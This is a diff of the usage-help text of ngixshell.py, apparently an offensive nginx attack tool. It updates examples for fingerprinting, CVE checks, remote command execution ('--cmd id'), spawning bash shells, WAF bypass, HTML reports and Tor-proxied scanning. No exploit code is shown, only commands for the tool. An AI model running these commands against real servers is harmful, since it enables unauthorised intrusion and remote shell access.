@@ -2037,19 +2037,28 @@ def main() -> int:
         epilog="""\
 Usage examples
 ──────────────
-  Full auto scan (fingerprint + CVEs + web audit + report):
+  Full auto scan (fingerprint + CVEs + web audit):
     ngixshell.py 127.0.0.1:19321
     ngixshell.py https://192.168.1.10
 
   Exploit (RCE):
     ngixshell.py 127.0.0.1:19321 --cmd 'id'
-    ngixshell.py 127.0.0.1:19321 --shell --listen-ip 10.0.0.1 --listen-port 4444
+    ngixshell.py 127.0.0.1:19321 --shell
+    ngixshell.py 127.0.0.1:19321 --shell --shell-type bash --upgrade-shell
+
+  WAF bypass:
+    ngixshell.py 127.0.0.1:19321 --waf-bypass
+    ngixshell.py 127.0.0.1:19321 --waf-bypass --waf-ip 10.10.10.1
+
+  Generate HTML report:
+    ngixshell.py 127.0.0.1:19321 --html-report
+    ngixshell.py 127.0.0.1:19321 --html-report results.html
 
   Subdomain scan:
     ngixshell.py --subdomain-scan example.com --scan-port 443
 
   Multiple targets:
-    ngixshell.py --target-file hosts.txt
+    ngixshell.py --target-file hosts.txt --json
 
   With proxy / auth:
     ngixshell.py 127.0.0.1 --proxy socks5://127.0.0.1:9050
